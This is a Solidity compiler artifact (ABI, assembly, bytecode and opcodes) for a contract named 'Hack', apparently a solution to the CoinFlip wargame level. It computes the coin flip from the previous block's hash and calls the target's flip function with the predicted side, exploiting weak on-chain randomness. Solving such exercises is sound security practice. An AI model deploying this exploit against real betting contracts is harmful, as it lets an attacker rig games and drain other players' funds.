{
	"Coin_Flip.sol": {
		"Hack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "contract CoinFlip",
							"name": "_flip",
							"type": "address"
						}
					],
					"name": "hack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"Coin_Flip.sol\":945:1317  contract Hack {... */\n  mstore(0x40, 0x80)\n    /* \"Coin_Flip.sol\":984:1061  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"Coin_Flip.sol\":967:1061  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x00\n  sstore\n    /* \"Coin_Flip.sol\":945:1317  contract Hack {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"Coin_Flip.sol\":945:1317  contract Hack {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      revert(0x00, 0x00)\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x6c4c174f\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"Coin_Flip.sol\":1071:1314  function hack(CoinFlip _flip) external {... */\n    tag_3:\n      tag_4\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_5\n      swap2\n      swap1\n      tag_6\n      jump\t// in\n    tag_5:\n      tag_7\n      jump\t// in\n    tag_4:\n      stop\n    tag_7:\n        /* \"Coin_Flip.sol\":1121:1139  uint256 blockValue */\n      0x00\n        /* \"Coin_Flip.sol\":1175:1176  1 */\n      0x01\n        /* \"Coin_Flip.sol\":1160:1172  block.number */\n      number\n        /* \"Coin_Flip.sol\":1160:1176  block.number - 1 */\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n        /* \"Coin_Flip.sol\":1150:1177  blockhash(block.number - 1) */\n      blockhash\n        /* \"Coin_Flip.sol\":1142:1178  uint256(blockhash(block.number - 1)) */\n      0x00\n      shr\n        /* \"Coin_Flip.sol\":1121:1178  uint256 blockValue = uint256(blockhash(block.number - 1)) */\n      swap1\n      pop\n        /* \"Coin_Flip.sol\":1189:1205  uint256 coinFlip */\n      0x00\n        /* \"Coin_Flip.sol\":1221:1227  FACTOR */\n      sload(0x00)\n        /* \"Coin_Flip.sol\":1208:1218  blockValue */\n      dup3\n        /* \"Coin_Flip.sol\":1208:1227  blockValue / FACTOR */\n      tag_11\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_11:\n        /* \"Coin_Flip.sol\":1189:1227  uint256 coinFlip = blockValue / FACTOR */\n      swap1\n      pop\n        /* \"Coin_Flip.sol\":1238:1247  bool side */\n      0x00\n        /* \"Coin_Flip.sol\":1262:1263  1 */\n      0x01\n        /* \"Coin_Flip.sol\":1250:1258  coinFlip */\n      dup3\n        /* \"Coin_Flip.sol\":1250:1263  coinFlip == 1 */\n      eq\n        /* \"Coin_Flip.sol\":1250:1278  coinFlip == 1 ? true : false */\n      tag_13\n      jumpi\n        /* \"Coin_Flip.sol\":1273:1278  false */\n      0x00\n        /* \"Coin_Flip.sol\":1250:1278  coinFlip == 1 ? true : false */\n      jump(tag_14)\n    tag_13:\n        /* \"Coin_Flip.sol\":1266:1270  true */\n      0x01\n        /* \"Coin_Flip.sol\":1250:1278  coinFlip == 1 ? true : false */\n    tag_14:\n        /* \"Coin_Flip.sol\":1238:1278  bool side = coinFlip == 1 ? true : false */\n      swap1\n      pop\n        /* \"Coin_Flip.sol\":1289:1294  _flip */\n      dup4\n        /* \"Coin_Flip.sol\":1289:1299  _flip.flip */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d263f67\n        /* \"Coin_Flip.sol\":1300:1304  side */\n      dup3\n        /* \"Coin_Flip.sol\":1289:1305  _flip.flip(side) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_15\n      swap2\n      swap1\n      tag_16\n      jump\t// in\n    tag_15:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_18\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_18:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n      pop\n        /* \"Coin_Flip.sol\":1110:1314  {... */\n      pop\n      pop\n      pop\n        /* \"Coin_Flip.sol\":1071:1314  function hack(CoinFlip _flip) external {... */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_22:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      0x00\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":334:460   */\n    tag_24:\n        /* \"#utility.yul\":371:378   */\n      0x00\n        /* \"#utility.yul\":411:453   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":404:409   */\n      dup3\n        /* \"#utility.yul\":400:454   */\n      and\n        /* \"#utility.yul\":389:454   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:460   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":466:562   */\n    tag_25:\n        /* \"#utility.yul\":503:510   */\n      0x00\n        /* \"#utility.yul\":532:556   */\n      tag_42\n        /* \"#utility.yul\":550:555   */\n      dup3\n        /* \"#utility.yul\":532:556   */\n      tag_24\n      jump\t// in\n    tag_42:\n        /* \"#utility.yul\":521:556   */\n      swap1\n      pop\n        /* \"#utility.yul\":466:562   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":568:679   */\n    tag_26:\n        /* \"#utility.yul\":620:627   */\n      0x00\n        /* \"#utility.yul\":649:673   */\n      tag_44\n        /* \"#utility.yul\":667:672   */\n      dup3\n        /* \"#utility.yul\":649:673   */\n      tag_25\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":638:673   */\n      swap1\n      pop\n        /* \"#utility.yul\":568:679   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":685:837   */\n    tag_27:\n        /* \"#utility.yul\":773:812   */\n      tag_46\n        /* \"#utility.yul\":806:811   */\n      dup2\n        /* \"#utility.yul\":773:812   */\n      tag_26\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":766:771   */\n      dup2\n        /* \"#utility.yul\":763:813   */\n      eq\n        /* \"#utility.yul\":753:831   */\n      tag_47\n      jumpi\n        /* \"#utility.yul\":827:828   */\n      0x00\n        /* \"#utility.yul\":824:825   */\n      0x00\n        /* \"#utility.yul\":817:829   */\n      revert\n        /* \"#utility.yul\":753:831   */\n    tag_47:\n        /* \"#utility.yul\":685:837   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":843:1012   */\n    tag_28:\n        /* \"#utility.yul\":904:909   */\n      0x00\n        /* \"#utility.yul\":942:948   */\n      dup2\n        /* \"#utility.yul\":929:949   */\n      calldataload\n        /* \"#utility.yul\":920:949   */\n      swap1\n      pop\n        /* \"#utility.yul\":958:1006   */\n      tag_49\n        /* \"#utility.yul\":1000:1005   */\n      dup2\n        /* \"#utility.yul\":958:1006   */\n      tag_27\n      jump\t// in\n    tag_49:\n        /* \"#utility.yul\":843:1012   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1018:1377   */\n    tag_6:\n        /* \"#utility.yul\":1092:1098   */\n      0x00\n        /* \"#utility.yul\":1141:1143   */\n      0x20\n        /* \"#utility.yul\":1129:1138   */\n      dup3\n        /* \"#utility.yul\":1120:1127   */\n      dup5\n        /* \"#utility.yul\":1116:1139   */\n      sub\n        /* \"#utility.yul\":1112:1144   */\n      slt\n        /* \"#utility.yul\":1109:1228   */\n      iszero\n      tag_51\n      jumpi\n        /* \"#utility.yul\":1147:1226   */\n      tag_52\n      tag_22\n      jump\t// in\n    tag_52:\n        /* \"#utility.yul\":1109:1228   */\n    tag_51:\n        /* \"#utility.yul\":1267:1268   */\n      0x00\n        /* \"#utility.yul\":1292:1360   */\n      tag_53\n        /* \"#utility.yul\":1352:1359   */\n      dup5\n        /* \"#utility.yul\":1343:1349   */\n      dup3\n        /* \"#utility.yul\":1332:1341   */\n      dup6\n        /* \"#utility.yul\":1328:1350   */\n      add\n        /* \"#utility.yul\":1292:1360   */\n      tag_28\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":1282:1360   */\n      swap2\n      pop\n        /* \"#utility.yul\":1238:1370   */\n      pop\n        /* \"#utility.yul\":1018:1377   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1383:1460   */\n    tag_29:\n        /* \"#utility.yul\":1420:1427   */\n      0x00\n        /* \"#utility.yul\":1449:1454   */\n      dup2\n        /* \"#utility.yul\":1438:1454   */\n      swap1\n      pop\n        /* \"#utility.yul\":1383:1460   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1466:1646   */\n    tag_30:\n        /* \"#utility.yul\":1514:1591   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1511:1512   */\n      0x00\n        /* \"#utility.yul\":1504:1592   */\n      mstore\n        /* \"#utility.yul\":1611:1615   */\n      0x11\n        /* \"#utility.yul\":1608:1609   */\n      0x04\n        /* \"#utility.yul\":1601:1616   */\n      mstore\n        /* \"#utility.yul\":1635:1639   */\n      0x24\n        /* \"#utility.yul\":1632:1633   */\n      0x00\n        /* \"#utility.yul\":1625:1640   */\n      revert\n        /* \"#utility.yul\":1652:1846   */\n    tag_10:\n        /* \"#utility.yul\":1692:1696   */\n      0x00\n        /* \"#utility.yul\":1712:1732   */\n      tag_57\n        /* \"#utility.yul\":1730:1731   */\n      dup3\n        /* \"#utility.yul\":1712:1732   */\n      tag_29\n      jump\t// in\n    tag_57:\n        /* \"#utility.yul\":1707:1732   */\n      swap2\n      pop\n        /* \"#utility.yul\":1746:1766   */\n      tag_58\n        /* \"#utility.yul\":1764:1765   */\n      dup4\n        /* \"#utility.yul\":1746:1766   */\n      tag_29\n      jump\t// in\n    tag_58:\n        /* \"#utility.yul\":1741:1766   */\n      swap3\n      pop\n        /* \"#utility.yul\":1790:1791   */\n      dup3\n        /* \"#utility.yul\":1787:1788   */\n      dup3\n        /* \"#utility.yul\":1783:1792   */\n      sub\n        /* \"#utility.yul\":1775:1792   */\n      swap1\n      pop\n        /* \"#utility.yul\":1814:1815   */\n      dup2\n        /* \"#utility.yul\":1808:1812   */\n      dup2\n        /* \"#utility.yul\":1805:1816   */\n      gt\n        /* \"#utility.yul\":1802:1839   */\n      iszero\n      tag_59\n      jumpi\n        /* \"#utility.yul\":1819:1837   */\n      tag_60\n      tag_30\n      jump\t// in\n    tag_60:\n        /* \"#utility.yul\":1802:1839   */\n    tag_59:\n        /* \"#utility.yul\":1652:1846   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1852:2032   */\n    tag_31:\n        /* \"#utility.yul\":1900:1977   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1897:1898   */\n      0x00\n        /* \"#utility.yul\":1890:1978   */\n      mstore\n        /* \"#utility.yul\":1997:2001   */\n      0x12\n        /* \"#utility.yul\":1994:1995   */\n      0x04\n        /* \"#utility.yul\":1987:2002   */\n      mstore\n        /* \"#utility.yul\":2021:2025   */\n      0x24\n        /* \"#utility.yul\":2018:2019   */\n      0x00\n        /* \"#utility.yul\":2011:2026   */\n      revert\n        /* \"#utility.yul\":2038:2223   */\n    tag_12:\n        /* \"#utility.yul\":2078:2079   */\n      0x00\n        /* \"#utility.yul\":2095:2115   */\n      tag_63\n        /* \"#utility.yul\":2113:2114   */\n      dup3\n        /* \"#utility.yul\":2095:2115   */\n      tag_29\n      jump\t// in\n    tag_63:\n        /* \"#utility.yul\":2090:2115   */\n      swap2\n      pop\n        /* \"#utility.yul\":2129:2149   */\n      tag_64\n        /* \"#utility.yul\":2147:2148   */\n      dup4\n        /* \"#utility.yul\":2129:2149   */\n      tag_29\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":2124:2149   */\n      swap3\n      pop\n        /* \"#utility.yul\":2168:2169   */\n      dup3\n        /* \"#utility.yul\":2158:2193   */\n      tag_65\n      jumpi\n        /* \"#utility.yul\":2173:2191   */\n      tag_66\n      tag_31\n      jump\t// in\n    tag_66:\n        /* \"#utility.yul\":2158:2193   */\n    tag_65:\n        /* \"#utility.yul\":2215:2216   */\n      dup3\n        /* \"#utility.yul\":2212:2213   */\n      dup3\n        /* \"#utility.yul\":2208:2217   */\n      div\n        /* \"#utility.yul\":2203:2217   */\n      swap1\n      pop\n        /* \"#utility.yul\":2038:2223   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2229:2319   */\n    tag_32:\n        /* \"#utility.yul\":2263:2270   */\n      0x00\n        /* \"#utility.yul\":2306:2311   */\n      dup2\n        /* \"#utility.yul\":2299:2312   */\n      iszero\n        /* \"#utility.yul\":2292:2313   */\n      iszero\n        /* \"#utility.yul\":2281:2313   */\n      swap1\n      pop\n        /* \"#utility.yul\":2229:2319   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2325:2434   */\n    tag_33:\n        /* \"#utility.yul\":2406:2427   */\n      tag_69\n        /* \"#utility.yul\":2421:2426   */\n      dup2\n        /* \"#utility.yul\":2406:2427   */\n      tag_32\n      jump\t// in\n    tag_69:\n        /* \"#utility.yul\":2401:2404   */\n      dup3\n        /* \"#utility.yul\":2394:2428   */\n      mstore\n        /* \"#utility.yul\":2325:2434   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2440:2650   */\n    tag_16:\n        /* \"#utility.yul\":2527:2531   */\n      0x00\n        /* \"#utility.yul\":2565:2567   */\n      0x20\n        /* \"#utility.yul\":2554:2563   */\n      dup3\n        /* \"#utility.yul\":2550:2568   */\n      add\n        /* \"#utility.yul\":2542:2568   */\n      swap1\n      pop\n        /* \"#utility.yul\":2578:2643   */\n      tag_71\n        /* \"#utility.yul\":2640:2641   */\n      0x00\n        /* \"#utility.yul\":2629:2638   */\n      dup4\n        /* \"#utility.yul\":2625:2642   */\n      add\n        /* \"#utility.yul\":2616:2622   */\n      dup5\n        /* \"#utility.yul\":2578:2643   */\n      tag_33\n      jump\t// in\n    tag_71:\n        /* \"#utility.yul\":2440:2650   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2656:2772   */\n    tag_34:\n        /* \"#utility.yul\":2726:2747   */\n      tag_73\n        /* \"#utility.yul\":2741:2746   */\n      dup2\n        /* \"#utility.yul\":2726:2747   */\n      tag_32\n      jump\t// in\n    tag_73:\n        /* \"#utility.yul\":2719:2724   */\n      dup2\n        /* \"#utility.yul\":2716:2748   */\n      eq\n        /* \"#utility.yul\":2706:2766   */\n      tag_74\n      jumpi\n        /* \"#utility.yul\":2762:2763   */\n      0x00\n        /* \"#utility.yul\":2759:2760   */\n      0x00\n        /* \"#utility.yul\":2752:2764   */\n      revert\n        /* \"#utility.yul\":2706:2766   */\n    tag_74:\n        /* \"#utility.yul\":2656:2772   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2778:2915   */\n    tag_35:\n        /* \"#utility.yul\":2832:2837   */\n      0x00\n        /* \"#utility.yul\":2863:2869   */\n      dup2\n        /* \"#utility.yul\":2857:2870   */\n      mload\n        /* \"#utility.yul\":2848:2870   */\n      swap1\n      pop\n        /* \"#utility.yul\":2879:2909   */\n      tag_76\n        /* \"#utility.yul\":2903:2908   */\n      dup2\n        /* \"#utility.yul\":2879:2909   */\n      tag_34\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":2778:2915   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2921:3266   */\n    tag_20:\n        /* \"#utility.yul\":2988:2994   */\n      0x00\n        /* \"#utility.yul\":3037:3039   */\n      0x20\n        /* \"#utility.yul\":3025:3034   */\n      dup3\n        /* \"#utility.yul\":3016:3023   */\n      dup5\n        /* \"#utility.yul\":3012:3035   */\n      sub\n        /* \"#utility.yul\":3008:3040   */\n      slt\n        /* \"#utility.yul\":3005:3124   */\n      iszero\n      tag_78\n      jumpi\n        /* \"#utility.yul\":3043:3122   */\n      tag_79\n      tag_22\n      jump\t// in\n    tag_79:\n        /* \"#utility.yul\":3005:3124   */\n    tag_78:\n        /* \"#utility.yul\":3163:3164   */\n      0x00\n        /* \"#utility.yul\":3188:3249   */\n      tag_80\n        /* \"#utility.yul\":3241:3248   */\n      dup5\n        /* \"#utility.yul\":3232:3238   */\n      dup3\n        /* \"#utility.yul\":3221:3230   */\n      dup6\n        /* \"#utility.yul\":3217:3239   */\n      add\n        /* \"#utility.yul\":3188:3249   */\n      tag_35\n      jump\t// in\n    tag_80:\n        /* \"#utility.yul\":3178:3249   */\n      swap2\n      pop\n        /* \"#utility.yul\":3134:3259   */\n      pop\n        /* \"#utility.yul\":2921:3266   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212209386bbf3cd620f606325e3ed957a638f81a0bad5cd4a3da4c508ea128c3d6e0c64736f6c634300081c0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60806040527f80000000000000000000000000000000000000000000000000000000000000005f553480156031575f5ffd5b5061031e8061003f5f395ff3fe608060405234801561000f575f5ffd5b5060043610610029575f3560e01c80636c4c174f1461002d575b5f5ffd5b6100476004803603810190610042919061016f565b610049565b005b5f60014361005791906101d0565b405f1c90505f5f548261006a9190610230565b90505f6001821461007b575f61007e565b60015b90508373ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff1660e01b81526004016100b9919061027a565b6020604051808303815f875af11580156100d5573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100f991906102bd565b5050505050565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61012d82610104565b9050919050565b5f61013e82610123565b9050919050565b61014e81610134565b8114610158575f5ffd5b50565b5f8135905061016981610145565b92915050565b5f6020828403121561018457610183610100565b5b5f6101918482850161015b565b91505092915050565b5f819050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f6101da8261019a565b91506101e58361019a565b92508282039050818111156101fd576101fc6101a3565b5b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f61023a8261019a565b91506102458361019a565b92508261025557610254610203565b5b828204905092915050565b5f8115159050919050565b61027481610260565b82525050565b5f60208201905061028d5f83018461026b565b92915050565b61029c81610260565b81146102a6575f5ffd5b50565b5f815190506102b781610293565b92915050565b5f602082840312156102d2576102d1610100565b5b5f6102df848285016102a9565b9150509291505056fea26469706673582212209386bbf3cd620f606325e3ed957a638f81a0bad5cd4a3da4c508ea128c3d6e0c64736f6c634300081c0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH0 SSTORE CALLVALUE DUP1 ISZERO PUSH1 0x31 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x31E DUP1 PUSH2 0x3F PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x29 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6C4C174F EQ PUSH2 0x2D JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x47 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x42 SWAP2 SWAP1 PUSH2 0x16F JUMP JUMPDEST PUSH2 0x49 JUMP JUMPDEST STOP JUMPDEST PUSH0 PUSH1 0x1 NUMBER PUSH2 0x57 SWAP2 SWAP1 PUSH2 0x1D0 JUMP JUMPDEST BLOCKHASH PUSH0 SHR SWAP1 POP PUSH0 PUSH0 SLOAD DUP3 PUSH2 0x6A SWAP2 SWAP1 PUSH2 0x230 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH1 0x1 DUP3 EQ PUSH2 0x7B JUMPI PUSH0 PUSH2 0x7E JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xB9 SWAP2 SWAP1 PUSH2 0x27A JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xD5 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xF9 SWAP2 SWAP1 PUSH2 0x2BD JUMP JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x12D DUP3 PUSH2 0x104 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x13E DUP3 PUSH2 0x123 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x14E DUP2 PUSH2 0x134 JUMP JUMPDEST DUP2 EQ PUSH2 0x158 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x169 DUP2 PUSH2 0x145 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x184 JUMPI PUSH2 0x183 PUSH2 0x100 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x191 DUP5 DUP3 DUP6 ADD PUSH2 0x15B JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x1DA DUP3 PUSH2 0x19A JUMP JUMPDEST SWAP2 POP PUSH2 0x1E5 DUP4 PUSH2 0x19A JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0x1FD JUMPI PUSH2 0x1FC PUSH2 0x1A3 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x23A DUP3 PUSH2 0x19A JUMP JUMPDEST SWAP2 POP PUSH2 0x245 DUP4 PUSH2 0x19A JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x255 JUMPI PUSH2 0x254 PUSH2 0x203 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x274 DUP2 PUSH2 0x260 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x28D PUSH0 DUP4 ADD DUP5 PUSH2 0x26B JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x29C DUP2 PUSH2 0x260 JUMP JUMPDEST DUP2 EQ PUSH2 0x2A6 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x2B7 DUP2 PUSH2 0x293 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2D2 JUMPI PUSH2 0x2D1 PUSH2 0x100 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x2DF DUP5 DUP3 DUP6 ADD PUSH2 0x2A9 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP4 DUP7 0xBB RETURN 0xCD PUSH3 0xF6063 0x25 0xE3 0xED SWAP6 PUSH27 0x638F81A0BAD5CD4A3DA4C508EA128C3D6E0C64736F6C634300081C STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "159600",
						"executionCost": "22305",
						"totalCost": "181905"
					},
					"external": {
						"hack(address)": "infinite"
					}
				},
				"methodIdentifiers": {
					"hack(address)": "6c4c174f"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 84,
						"contract": "Coin_Flip.sol:Hack",
						"label": "FACTOR",
						"offset": 0,
						"slot": "0",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}